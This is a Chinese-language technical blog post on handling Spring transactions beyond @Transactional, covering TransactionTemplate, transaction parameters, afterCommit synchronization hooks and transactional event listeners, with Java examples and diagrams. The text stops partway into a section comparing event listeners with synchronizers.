pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">@Transactional做不到的5件事，我用这6种方法解决了</h2>
<p>看Mall项目订单代码时发现：一个方法操作6张表，14步业务逻辑，全在一个事务里，居然没炸。</p>
<p>研究了两天，发现了6种比<code>@Transactional</code>更灵活的玩法。写了个demo项目验证了一遍。</p>
<h3 data-id="heading-1">我们要解决的痛点</h3>
<p>日常开发中，<code>@Transactional</code>解决不了的几个问题：</p>
<ol>
<li><strong>库存不足时</strong>：想保留订单记录标记"待补货"，但不知道怎么不回滚</li>
<li><strong>发MQ消息</strong>：在事务里发了消息，结果事务回滚了，消息却发出去了</li>
<li><strong>批量操作</strong>：100个订单发货，1个失败就全部回滚，但其实想让成功的继续</li>
<li><strong>记录日志</strong>：业务失败了也想记录日志，但事务回滚了日志也没了</li>
<li><strong>隔离级别/超时</strong>：不知道<code>@Transactional</code>那些参数怎么用</li>
</ol>
<p>这篇文章会用实际代码演示6种解决方案。</p>
<h3 data-id="heading-2">目录</h3>
<ul>
<li><a href="#%E7%BC%96%E7%A8%8B%E5%BC%8F%E4%BA%8B%E5%8A%A1%E5%8C%BA%E5%88%86%E4%B8%9A%E5%8A%A1%E5%A4%B1%E8%B4%A5%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8" title="#%E7%BC%96%E7%A8%8B%E5%BC%8F%E4%BA%8B%E5%8A%A1%E5%8C%BA%E5%88%86%E4%B8%9A%E5%8A%A1%E5%A4%B1%E8%B4%A5%E5%92%8C%E7%B3%BB%E7%BB%9F%E5%BC%82%E5%B8%B8">编程式事务：区分业务失败和系统异常</a></li>
<li><a href="#transactional%E7%9A%84%E5%8F%82%E6%95%B0%E6%88%91%E8%A2%AB%E5%9D%91%E8%BF%87" title="#transactional%E7%9A%84%E5%8F%82%E6%95%B0%E6%88%91%E8%A2%AB%E5%9D%91%E8%BF%87">@Transactional参数：隔离级别和超时</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E6%8F%90%E4%BA%A4%E5%90%8E%E5%8F%91mq%E6%88%91%E4%B9%8B%E5%89%8D%E9%83%BD%E5%81%9A%E9%94%99%E4%BA%86" title="#%E4%BA%8B%E5%8A%A1%E6%8F%90%E4%BA%A4%E5%90%8E%E5%8F%91mq%E6%88%91%E4%B9%8B%E5%89%8D%E9%83%BD%E5%81%9A%E9%94%99%E4%BA%86">事务同步器：提交后发MQ</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E8%A7%A3%E8%80%A6%E5%89%AF%E4%BD%9C%E7%94%A8%E6%93%8D%E4%BD%9C" title="#%E4%BA%8B%E5%8A%A1%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E8%A7%A3%E8%80%A6%E5%89%AF%E4%BD%9C%E7%94%A8%E6%93%8D%E4%BD%9C">事务事件监听：解耦副作用操作</a></li>
<li><a href="#%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C%E5%BF%85%E9%A1%BB%E7%94%A8%E6%89%8B%E5%8A%A8%E4%BA%8B%E5%8A%A1" title="#%E6%89%B9%E9%87%8F%E6%93%8D%E4%BD%9C%E5%BF%85%E9%A1%BB%E7%94%A8%E6%89%8B%E5%8A%A8%E4%BA%8B%E5%8A%A1">手动控制事务：批量操作</a></li>
<li><a href="#%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E6%9C%BA%E5%88%B63%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF" title="#%E4%BA%8B%E5%8A%A1%E4%BC%A0%E6%92%AD%E6%9C%BA%E5%88%B63%E7%A7%8D%E5%B8%B8%E7%94%A8%E5%9C%BA%E6%99%AF">事务传播机制：3种常用场景</a></li>
</ul>
<h3 data-id="heading-3">关于demo项目</h3>
<p>本文代码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fsh_wangwanbao%2Fsimple-transactional" target="_blank" title="https://gitee.com/sh_wangwanbao/simple-transactional" ref="nofollow noopener noreferrer">gitee.com/sh_wangwanb…</a></p>
<p><strong>特点</strong>：集成测试框架，通过反射自动构建参数，启动即测试，自动生成markdown报告。不用手动准备数据，不用一个个跑测试用例。</p>
<p>导入数据库脚本（doc/simple-transactional-init.sql），改下配置，启动项目就能看到完整测试结果。</p>
<hr/>
<h3 data-id="heading-4">编程式事务：区分业务失败和系统异常</h3>
<p>这是我在Mall里发现的一个场景：订单创建后要调用风控服务检查。</p>
<ul>
<li><strong>风控不通过</strong>（业务规则）：订单要保留，标记"待审核"，人工复核</li>
<li><strong>风控服务挂了</strong>（系统故障）：订单要回滚，不能留脏数据</li>
</ul>
<p><strong>用<code>@Transactional</code>做不到</strong>。因为它只能靠抛异常触发回滚，无法区分这两种情况。</p>
<h4 data-id="heading-5">TransactionTemplate可以动态控制</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> OrderResult <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderParam param)</span> {
    
    <span class="hljs-keyword">return</span> transactionTemplate.execute(status -&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 创建订单</span>
            <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> buildOrder(param);
            orderMapper.insert(order);
            
            <span class="hljs-comment">// 2. 创建订单商品</span>
            List&lt;OrderItem&gt; items = buildOrderItems(order);
            orderItemMapper.batchInsert(items);
            
            <span class="hljs-comment">// 3. 锁定库存</span>
            lockStock(param.getItems());
            
            <span class="hljs-comment">// 4. 调用风控服务检查</span>
            <span class="hljs-type">RiskCheckResult</span> <span class="hljs-variable">riskResult</span> <span class="hljs-operator">=</span> riskService.check(order);
            
            <span class="hljs-keyword">if</span> (!riskResult.isPass()) {
                <span class="hljs-comment">// 风控不通过 - 业务失败，但不回滚</span>
                order.setStatus(OrderStatus.WAIT_AUDIT);  <span class="hljs-comment">// 待审核</span>
                order.setNote(<span class="hljs-string">"风控检查未通过："</span> + riskResult.getReason());
                orderMapper.updateById(order);
                
                <span class="hljs-comment">// 关键：不调用 status.setRollbackOnly()</span>
                <span class="hljs-comment">// 订单和商品明细都会保留</span>
                <span class="hljs-keyword">return</span> OrderResult.fail(<span class="hljs-string">"订单需人工审核"</span>);
            }
            
            <span class="hljs-comment">// 风控通过，订单正常</span>
            <span class="hljs-keyword">return</span> OrderResult.success(order.getId());
            
        } <span class="hljs-keyword">catch</span> (RiskServiceException e) {
            <span class="hljs-comment">// 风控服务异常 - 系统故障，必须回滚</span>
            log.error(<span class="hljs-string">"风控服务异常"</span>, e);
            status.setRollbackOnly();
            <span class="hljs-keyword">return</span> OrderResult.error(<span class="hljs-string">"系统异常，请稍后重试"</span>);
            
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// 其他异常也回滚</span>
            status.setRollbackOnly();
            <span class="hljs-keyword">return</span> OrderResult.error(e.getMessage());
        }
    });
}
</code></pre>
<h4 data-id="heading-6">画个图就明白了</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[开始事务] --&gt; B[创建订单]
    B --&gt; C[创建订单商品]
    C --&gt; D[锁定库存]
    D --&gt; E[调用风控服务]
    
    E --&gt; F{风控结果?}
    
    F --&gt;|不通过-业务失败| G[更新订单状态=待审核]
    G --&gt; H[提交事务]
    H --&gt; I[订单保留,状态=待审核]
    
    F --&gt;|通过| J[提交事务]
    J --&gt; K[订单正常创建]
    
    F --&gt;|服务异常-系统故障| L[setRollbackOnly]
    L --&gt; M[回滚事务]
    M --&gt; N[订单被删除]
</code></pre>
<h4 data-id="heading-7">这才是编程式事务的价值</h4>

























<table><thead><tr><th>场景</th><th>@Transactional</th><th>TransactionTemplate</th></tr></thead><tbody><tr><td>风控不通过</td><td>抛异常→全回滚</td><td>不回滚，保留订单</td></tr><tr><td>风控服务挂了</td><td>抛异常→全回滚</td><td>回滚，不留脏数据</td></tr><tr><td>库存不足</td><td>抛异常→全回滚</td><td>保留订单，标记"待补货"</td></tr></tbody></table>
<p><strong>核心区别</strong>：能区分"业务失败"和"系统异常"，动态决定要不要回滚。</p>
<p>我测试了一下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试风控不通过（高金额订单）</span>
POST /programmatic/risk-check

<span class="hljs-comment"># 结果</span>
订单ID：8
订单状态：待审核
订单备注：风控检查未通过：金额过高
数据库：订单和商品明细都保留了
</code></pre>
<p>这玩意儿我之前真不知道能这么用。</p>
<h3 data-id="heading-8">@Transactional的参数，我被坑过</h3>
<p>Mall的商品创建方法是这么写的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(
    isolation = Isolation.REPEATABLE_READ,    
    propagation = Propagation.REQUIRED,      
    timeout = 30,                            
    rollbackFor = Exception.class            
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">createProduct</span><span class="hljs-params">(ProductParam param)</span> {
    <span class="hljs-comment">// 插入8张表...</span>
}
</code></pre>
<p>我之前都是直接<code>@Transactional</code>，从来不加参数。后来踩了几次坑才知道这些参数的用处。</p>
<h4 data-id="heading-9">isolation这个参数要注意</h4>
<p>有次数据库从MySQL换成PostgreSQL，突然出现了幻读问题。</p>
<p>原因是：</p>
<ul>
<li>MySQL默认 <code>REPEATABLE_READ</code>（可重复读）</li>
<li>PostgreSQL默认 <code>READ_COMMITTED</code>（读已提交）</li>
</ul>
<p><strong>如果代码里没显式指定隔离级别，换数据库就可能出问题。</strong></p>
<p>所以建议：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 明确指定隔离级别，不依赖数据库默认值</span>
<span class="hljs-meta">@Transactional(isolation = Isolation.REPEATABLE_READ)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">someMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 避免环境切换导致行为变化</span>
}
</code></pre>
<h4 data-id="heading-10">timeout和rollbackFor简单说两句</h4>
<p><strong>timeout</strong>：防止长事务锁表</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(timeout = 30)</span>  <span class="hljs-comment">// 30秒超时</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complexTask</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>rollbackFor</strong>：Spring默认只有RuntimeException才回滚，Checked Exception不回滚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>  <span class="hljs-comment">// 明确指定</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>这两个参数记得加上，能避免很多坑。</p>
<h3 data-id="heading-11">事务提交后发MQ，我之前都做错了</h3>
<p>订单创建成功后，要发个MQ消息（30分钟后自动取消未支付订单）。</p>
<p>我之前是这么写的：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 直接发MQ</span>
    mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, order.getId());
}
</code></pre>
<p>看起来没问题吧？实际上有个致命问题。</p>
<h4 data-id="heading-12">问题出在时机上</h4>
<p>画个图就明白了：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Service
    participant DB as Database
    participant MQ as RabbitMQ
    
    rect rgb(255, 240, 240)
    Note over S,MQ: 错误的做法
    S-&gt;&gt;DB: 1. INSERT订单
    Note over DB: 数据在事务内&lt;br/&gt;还没提交
    
    S-&gt;&gt;MQ: 2. 发送MQ消息
    Note over MQ: 消息已发出
    
    S-&gt;&gt;DB: 3. 后面某步失败
    DB--&gt;&gt;S: 4. 事务回滚
    Note over DB: 订单被删除
    
    Note over MQ,DB: 问题：消息发了&lt;br/&gt;但数据没了
    end
</code></pre>
<p><strong>问题本质</strong>：MQ消息发出去了，但事务回滚了，订单根本不存在。30分钟后消费者去取消订单，发现订单不存在。</p>
<p>这就是<strong>副作用的时机与事务一致性</strong>问题：</p>
<ul>
<li>订单插入、库存扣减 → 在同一个事务里，要么全成功，要么全回滚</li>
<li>MQ消息 → 不在这个事务里，发出去就收不回来了</li>
</ul>
<h4 data-id="heading-13">事务同步器解决这个问题</h4>
<p>Spring提供了事务生命周期的钩子，让你在特定阶段执行回调：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 注册事务同步器</span>
    TransactionSynchronizationManager.registerSynchronization(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionSynchronization</span>() {
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// 只有事务提交成功，这里才会执行</span>
                mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, order.getId());
                log.info(<span class="hljs-string">"MQ消息已发送"</span>);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span> {
                <span class="hljs-keyword">if</span> (status == STATUS_ROLLED_BACK) {
                    log.info(<span class="hljs-string">"事务回滚，MQ消息不会发送"</span>);
                }
            }
        }
    );
}
</code></pre>
<p>现在的时序是这样：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as Service
    participant DB as Database
    participant MQ as RabbitMQ
    
    rect rgb(240, 255, 240)
    Note over S,MQ: 正确的做法
    S-&gt;&gt;DB: 1. INSERT订单
    S-&gt;&gt;S: 2. 注册afterCommit回调
    
    alt 事务成功
        S-&gt;&gt;DB: 3. COMMIT
        Note over DB: 数据已持久化
        S-&gt;&gt;MQ: 4. 触发afterCommit&lt;br/&gt;发送MQ消息
        Note over MQ: 数据和消息一致
    else 事务失败
        S-&gt;&gt;DB: 3. ROLLBACK
        Note over DB: 数据被删除
        Note over S: afterCommit不执行
        Note over MQ: 消息不会发送
    end
    end
</code></pre>
<p><strong>核心区别</strong>：只有订单真正提交到数据库后，才发MQ消息。事务回滚了，消息就不发。</p>
<h4 data-id="heading-14">4个生命周期钩子</h4>
<p>事务同步器提供了4个回调点：</p>
<pre><code class="hljs language-java" lang="java">TransactionSynchronizationManager.registerSynchronization(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionSynchronization</span>() {
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> readOnly)</span> {
            log.info(<span class="hljs-string">"【阶段1-beforeCommit】事务即将提交"</span>);
            <span class="hljs-comment">// 最后的数据校验</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCompletion</span><span class="hljs-params">()</span> {
            log.info(<span class="hljs-string">"【阶段2-beforeCompletion】事务即将完成"</span>);
            <span class="hljs-comment">// 清理临时资源</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
            log.info(<span class="hljs-string">"【阶段3-afterCommit】事务已提交"</span>);
            <span class="hljs-comment">// 发MQ、清缓存（数据已持久化）</span>
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(<span class="hljs-type">int</span> status)</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">statusStr</span> <span class="hljs-operator">=</span> (status == STATUS_COMMITTED) ? <span class="hljs-string">"提交"</span> : <span class="hljs-string">"回滚"</span>;
            log.info(<span class="hljs-string">"【阶段4-afterCompletion】事务已完成，状态：{}"</span>, statusStr);
        }
    }
);
</code></pre>
<p>执行顺序是固定的：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[开始事务] --&gt; B[业务逻辑执行]
    B --&gt; C{要提交?}
    
    C --&gt;|是| D[beforeCommit]
    D --&gt; E[beforeCompletion]
    E --&gt; F[COMMIT]
    F --&gt; G[afterCommit]
    G --&gt; H[afterCompletion状态COMMITTED]
    
    C --&gt;|否| I[beforeCompletion]
    I --&gt; J[ROLLBACK]
    J --&gt; K[afterCompletion状态ROLLED_BACK]
</code></pre>
<h4 data-id="heading-15">哪些场景必须用afterCommit</h4>
<p>所有"对外的副作用"都应该放在afterCommit里：</p>
<p><strong>场景1：发MQ消息</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 延迟取消订单</span>
    mqSender.send(<span class="hljs-string">"order.cancel.delay"</span>, orderId);
}
</code></pre>
<p><strong>场景2：清理缓存</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 清理商品缓存</span>
    redisTemplate.delete(<span class="hljs-string">"product:"</span> + productId);
}
</code></pre>
<p><strong>场景3：记录日志到另一个库</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 写到日志库（不在当前事务）</span>
    logMapper.insert(businessLog);
}
</code></pre>
<p><strong>场景4：调用外部服务</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 通知第三方</span>
    thirdPartyService.notify(order);
}
</code></pre>
<p><strong>核心原则</strong>：只有订单数据真正持久化了，外部世界才能知道。</p>
<h4 data-id="heading-16">同库的日志也要用afterCommit吗？</h4>
<p>理论上，如果日志表和订单表在同一个数据库、同一个事务里，写早了会一起回滚，不会有问题。</p>
<p>但实际业务中，我们希望：</p>
<ol>
<li><strong>解耦</strong>：订单业务和日志记录分离</li>
<li><strong>性能</strong>：日志操作不影响主事务耗时</li>
<li><strong>重试</strong>：日志失败可以独立重试，不影响订单</li>
</ol>
<p>所以建议还是放在afterCommit里。</p>
<h4 data-id="heading-17">我测试了一下</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 运行测试</span>
POST /synchronization/phases

<span class="hljs-comment"># 控制台输出</span>
【阶段1-beforeCommit】事务即将提交
【阶段2-beforeCompletion】事务即将完成
【阶段3-afterCommit】事务已提交
【阶段4-afterCompletion】事务已完成，状态：提交
MQ消息已发送
</code></pre>
<p>顺序是固定的，非常可靠。</p>
<h3 data-id="heading-18">事务事件监听：解耦副作用操作</h3>
<p>订单创建成功后，要做3件事：发MQ、记录日志、发通知。</p>
<p>如果都写在一个方法里，代码会很臃肿：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    
    <span class="hljs-comment">// 业务逻辑越来越多</span>
    mqSender.send(...);
    logService.save(...);
    notifyService.send(...);
}
</code></pre>
<p>而且事务范围太大了，发短信也在事务里？</p>
<h4 data-id="heading-19">事务事件监听可以解耦</h4>
<p><strong>第1步：定义事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Getter</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCreatedEvent</span> {
    <span class="hljs-keyword">private</span> String orderSn;
    <span class="hljs-keyword">private</span> Long memberId;
    <span class="hljs-keyword">private</span> BigDecimal amount;
}
</code></pre>
<p><strong>第2步：发布事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationEventPublisher eventPublisher;
    
    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(OrderParam param)</span> {
        <span class="hljs-comment">// 创建订单</span>
        orderMapper.insert(order);
        
        <span class="hljs-comment">// 发布事件（立即发布，但监听器何时处理取决于监听方式）</span>
        <span class="hljs-type">OrderCreatedEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderCreatedEvent</span>(
            order.getOrderSn(),
            order.getMemberId(),
            order.getTotalAmount()
        );
        eventPublisher.publishEvent(event);
        
        log.info(<span class="hljs-string">"事件已发布"</span>);
    }
}
</code></pre>
<p><strong>第3步：监听事件</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderEventListener</span> {
    
    <span class="hljs-comment">// 关键：@TransactionalEventListener + AFTER_COMMIT</span>
    <span class="hljs-comment">// 事件会被"挂起"，等事务提交成功后才处理</span>
    <span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderCreated</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        log.info(<span class="hljs-string">"监听到订单创建：{}"</span>, event.getOrderSn());
        
        <span class="hljs-comment">// 这些操作在事务提交后才执行</span>
        mqSender.send(<span class="hljs-string">"order.cancel"</span>, event.getOrderSn());
        logMapper.insert(log);
        notifyService.send(event.getMemberId());
    }
    
    <span class="hljs-comment">// 事务回滚后执行</span>
    <span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_ROLLBACK)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleOrderFailed</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
        log.info(<span class="hljs-string">"订单创建失败：{}"</span>, event.getOrderSn());
    }
}
</code></pre>
<h4 data-id="heading-20">事件发布与事务的关系</h4>
<p>这里容易混淆的点：<strong><code>publishEvent</code>本身与事务无关，但监听器的执行时机取决于监听方式。</strong></p>
<p>画个图说明：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant S as OrderService
    participant E as EventPublisher
    participant L1 as @EventListener&lt;br/&gt;普通监听器
    participant L2 as @TransactionalEventListener&lt;br/&gt;AFTER_COMMIT
    participant DB as Database
    
    rect rgb(255, 245, 240)
    Note over S,DB: 方法有 @Transactional
    S-&gt;&gt;DB: 1. INSERT订单
    S-&gt;&gt;E: 2. publishEvent(event)
    
    E-&gt;&gt;L1: 3. 立即同步调用
    Note over L1: 普通监听器立即执行&lt;br/&gt;此时事务还没提交
    
    E-&gt;&gt;L2: 4. 事件挂起
    Note over L2: AFTER_COMMIT监听器不执行&lt;br/&gt;等待事务提交
    
    alt 事务提交成功
        S-&gt;&gt;DB: 5. COMMIT
        DB-&gt;&gt;L2: 6. 触发AFTER_COMMIT
        Note over L2: 监听器执行&lt;br/&gt;数据已持久化
    else 事务回滚
        S-&gt;&gt;DB: 5. ROLLBACK
        Note over L2: AFTER_COMMIT不执行
    end
    end
</code></pre>
<p><strong>关键区别</strong>：</p>

























<table><thead><tr><th>监听方式</th><th>执行时机</th><th>事务回滚影响</th></tr></thead><tbody><tr><td>@EventListener</td><td>立即执行</td><td>已执行的副作用无法撤销</td></tr><tr><td>@TransactionalEventListener(AFTER_COMMIT)</td><td>事务提交后</td><td>事务回滚则不执行</td></tr><tr><td>@TransactionalEventListener(AFTER_ROLLBACK)</td><td>事务回滚后</td><td>只有回滚才执行</td></tr></tbody></table>
<h4 data-id="heading-21">4个事务阶段</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 提交前（做最后校验）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.BEFORE_COMMIT)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeCommit</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 事务即将提交，可以做最后校验</span>
}

<span class="hljs-comment">// 提交后（发副作用）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCommit</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 数据已持久化，可以安全地发MQ、清缓存</span>
}

<span class="hljs-comment">// 回滚后（记录失败）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_ROLLBACK)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterRollback</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 事务失败了，记录失败日志</span>
}

<span class="hljs-comment">// 完成后（清理资源）</span>
<span class="hljs-meta">@TransactionalEventListener(phase = TransactionPhase.AFTER_COMPLETION)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// 无论成功失败都会执行</span>
}
</code></pre>
<h4 data-id="heading-22">几个要注意的地方</h4>
<p><strong>1. 必须在事务方法里发布</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 错误：方法没有 @Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// AFTER_COMMIT监听器不会触发！</span>
}

<span class="hljs-comment">// 正确：方法有 @Transactional</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// 监听器会在提交后触发</span>
}
</code></pre>
<p><strong>2. 子事务的事件跟随子事务</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parentMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 父事务</span>
    
    childMethod();  <span class="hljs-comment">// 子事务（REQUIRES_NEW）</span>
}

<span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">childMethod</span><span class="hljs-params">()</span> {
    orderMapper.insert(order);
    eventPublisher.publishEvent(event);  <span class="hljs-comment">// 监听器跟随子事务的提交</span>
}
</code></pre>
<p><strong>3. 如果没有事务怎么办</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 监听器默认不执行，除非加 fallbackExecution=true</span>
<span class="hljs-meta">@TransactionalEventListener(
    phase = TransactionPhase.AFTER_COMMIT,
    fallbackExecution = true  // 没有事务也会执行
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleEvent</span><span class="hljs-params">(OrderCreatedEvent event)</span> {
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-23">对比事务同步器</h4>























